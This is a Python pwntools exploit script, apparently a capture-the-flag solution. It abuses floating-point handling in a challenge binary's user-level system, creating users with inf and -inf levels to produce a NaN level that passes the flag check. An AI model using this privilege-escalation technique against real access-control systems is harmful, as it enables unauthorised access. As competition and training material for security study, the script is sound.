from pwn import *
from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0  # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()


def login(username, password):
    p.sendlineafter(b"Option? ", b"l")
    p.sendlineafter(b"Username: ", username.encode())
    p.sendlineafter(b"Password: ", password.encode())

def logout():
    p.sendlineafter(b"Option? ", b"o")
    

def add_user(new_username, new_password, other_username):
    p.sendlineafter(b"Option? ", b"a")
    
    p.sendlineafter(b"New Username: ", new_username.encode())
    p.sendlineafter(b"New Password: ", new_password.encode())
    p.sendlineafter(b"Other Username: ", other_username.encode())

def get_flag():
    p.sendlineafter(b"Option? ", b"f")
    return p.readline().decode()

def list_users():
    p.sendlineafter(b"Option? ", b"s")
    
    lines = p.recvuntil(b"===").splitlines(keepends=False)

    user_dict = dict()

    for line in lines[:-1]:
        username, password = line.split(b": ")
        user_dict[username.decode()] = float(password.decode())

    return user_dict
    


login(f"user1", f"user1")

# add a user with inf and -inf levels
add_user("inf", "p", "user1")
add_user("-inf", "p", "admin")

# inf + (-inf) = nan
login(f"inf", f"p")
add_user("nan", "p", "-inf")

# nan passes get_flag comparisons
login(f"nan", f"p")
print(get_flag())
